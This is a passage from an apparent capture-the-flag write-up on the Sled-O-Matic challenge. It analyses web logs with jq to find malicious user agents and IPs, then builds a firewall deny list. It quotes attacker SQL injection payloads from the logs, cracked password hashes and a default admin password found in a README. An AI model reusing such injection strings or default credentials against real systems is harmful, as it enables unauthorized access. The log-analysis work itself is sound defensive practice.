<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;7db0f6de-8de7-4841-9084-28fa914b0f2e|metasploit|nessus&#34;</span> &gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible msie 5.0;windows_98\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible msie 5.0;windows_98\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 5.01; windows nt 500.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.0; windows nt 5.0; .nets clr  1.1.4322\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.0; windows nt 5.1; sv1; funwebproducts; .net clr 1.1.4322; .net clr 2.0.50727\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.0; windows nt5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.1; windows nt6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 6.a; windows nts\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windos nt 6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windos nt 6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windows nt 5.1; antivirxp08; .net clr 1.1.4322\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 7.0; windows nt 5.1; tridents/4.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; window nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; windows mt 6.1; trident/4.0; .net clr 1.1.4322; \)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; windows nt 5.1; tridents/4.0; .net clr 1.1.4322; peoplepal 7.0; .net clr 2.0.50727\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie 8.0; windows_nt 5.1; trident/4.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msie6.0; windows nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible; msiee 7.0; windows nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible;msie 7.0;windows nt 5.1\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i<span style="color:#f1fa8c">&#34;mozilla/4.0 \(compatible;msie 7.0;windows nt 6.&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/4.0\(compatible; msie 666.0; windows nt 5.1&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(compatible; goglebot/2.1; \+http://www.google.com/bot.html\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(compatible; msie 10.0; w1ndow nt 6.1; trident/6.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows nt 10.0;win64;x64\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows nt 5.1 ; v.\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows nt 6.1; wow62; rv:53.0\) gecko/20100101 chrome /53.0&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows; u; windows nt 5.1; en-us\) aplewebkit/525.13 \(khtml, like gecko\) chrome/4.0.221.6 safari/525.13&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 \(windows; u; windows nt 5.1; en-us; rv:1.9.2.3\) gecko/20100401 firefox/3.6.1 \(.net clr 3.5.30731&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla/5.0 windows; u; windows nt5.1; en-us; rv:1.9.2.3\) gecko/20100401 firefox/3.6.1 \(.net clr 3.5.30729\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;mozilla4.0 \(compatible; mssie 8.0; windows nt 5.1; trident/5.0\)&#34;</span>&gt;&gt; pivot.ua.json
cat http.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | egrep -i <span style="color:#f1fa8c">&#34;opera/8.81 \(windows-nt 6.1; u; en\)&#34;</span>&gt;&gt; pivot.ua.json
</code></pre></td></tr></table>
</div>
</div><h3 id="login-the-web-application">Login the web application</h3>
<p>Let&rsquo;s try to find how the attacker could login by looking into our original http.json.malicious
We find some MD5-CRYPT <code>$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.</code> hash that we can break with john: it&rsquo;s the empty string
Another MD5 hash <code>5e0bd03bec244039678f2b955a2595aa</code> can be cracked to <code>nessus</code></p>
<p>Concatenation of hexadecimals h = &lsquo;0x617664737363616e6e696e67L&rsquo; which translates via python h[2:-1].decode(&lsquo;hex&rsquo;) into &lsquo;avdsscanning&rsquo;
Those are all false positives &hellip;</p>
<pre tabindex="0"><code>&quot;/api/stations?station_id=1' UNION SELECT 1,'automatedscanning','5e0bd03bec244039678f2b955a2595aa','',0,'',''/*&amp;password=MoAOWs&quot;
&quot;/api/weather?station_id=1' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'/*&amp;file=index&amp;pass=&quot;
&quot;1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '&quot;
</code></pre><p>we can figure out how the attacker could login by looking into our original http.json:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json | jq -j <span style="color:#f1fa8c">&#39; select(.status_code == 200) | .method , &#34; &#34;, .uri , &#34;\n&#34;&#39;</span> | grep -vi <span style="color:#f1fa8c">&#34;api&#34;</span> | sort | uniq -c | sort | head -4
      <span style="color:#bd93f9">1</span> GET /README.md
      <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>We find one README.md file which contains the admin password in cleartext:</p>
<pre tabindex="0"><code># Sled-O-Matic - Sleigh Route Finder Web API

### Installation

sudo apt install python3-pip
sudo python3 -m pip install -r requirements.txt

#### Running:

python3 ./srfweb.py

#### Logging in:

You can login using the default admin pass:

admin 924158F9522B3744F5FCD4D10FAC4356

However, it's recommended to change this in the sqlite db to something custom.
</code></pre><p>We now know about the admin password and the underlying database which is of type sqlite.
We can therefore login.</p>
<h2 id="update-the-firewall-rules">Update the firewall rules</h2>
<p>In developer tools, we can change the firewall settings by typing the following in the console <code>post_rules(['D:&lt;IP1&gt;/0','D:&lt;IP2&gt;/32',...,'A:0.0.0.0/0'])</code>
Let&rsquo;s build a long string with jq:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat http.json.malicious | jq <span style="color:#f1fa8c">&#39;.[&#34;id.orig_h&#34;]&#39;</span> &gt;&gt; bad_ips
cat pivot.ua.json | jq <span style="color:#f1fa8c">&#39;.[&#34;id.orig_h&#34;]&#39;</span> &gt;&gt; bad_ips
cat bad_ips | sort | uniq | tr -d <span style="color:#f1fa8c">&#39;&#34;&#39;</span> | awk <span style="color:#f1fa8c">&#39;{printf(&#34;\&#34;D:%s/32\&#34;,&#34;,$0)}&#39;</span>  | awk <span style="color:#f1fa8c">&#39;{printf(&#34;post_rules([%s\&#34;A:0.0.0.0/0\&#34;])&#34;,$0)}&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>the above command generate the below output that we can type in the firefox developer tools console to get the RID and complete Objective 12</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">post_rules([
  <span style="color:#f1fa8c">&#34;D:0.216.249.31/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:10.122.158.57/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:10.155.246.29/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:102.143.16.184/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:104.179.109.113/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:106.132.195.153/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:106.93.213.219/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:111.81.145.191/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:116.116.98.205/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:118.196.230.170/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:121.7.186.163/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:123.127.233.97/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:126.102.12.53/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:129.121.121.48/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:13.39.153.254/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:131.186.145.73/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:135.203.243.43/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:135.32.99.116/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:140.60.154.239/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:148.146.134.52/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:150.45.133.97/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:150.50.77.238/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:155.129.97.35/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:158.171.84.209/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:168.66.108.62/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:173.37.160.150/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:18.181.152.167/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:186.28.46.179/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:187.152.203.243/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:187.178.169.123/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:19.235.69.221/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:190.245.228.38/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:193.228.194.36/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:2.230.60.70/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:2.240.116.254/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:200.75.228.240/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:203.68.29.5/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:217.132.156.225/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:22.34.153.164/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:220.132.33.81/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:223.149.180.133/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:225.191.220.138/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:226.102.56.13/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:226.240.188.154/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:227.110.45.126/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:229.133.163.235/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:229.229.189.246/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:23.49.177.78/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:23.79.123.99/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:230.246.50.221/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:231.179.108.238/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:238.143.78.114/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:249.237.77.152/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:249.34.9.16/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:249.90.116.138/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:25.80.197.172/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:250.22.86.40/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:252.122.243.212/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:253.182.102.55/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:254.140.181.172/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:27.88.56.114/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:28.169.41.122/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:29.0.183.220/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:31.116.232.143/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:31.254.228.4/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:32.168.17.54/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:33.132.98.193/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:34.129.179.28/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:34.155.174.167/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.103.246.130/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.103.246.250/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.127.244.30/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.16.149.112/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:42.191.112.181/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:44.164.136.41/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:44.74.106.131/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:45.239.232.245/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:48.66.193.176/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:49.161.8.58/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:50.154.111.0/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:53.160.218.44/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:56.5.47.137/32&#34;</span>,
  <span style="color:#f1fa8c">&#34;D:6.144.27.227/32&#34;</span>,
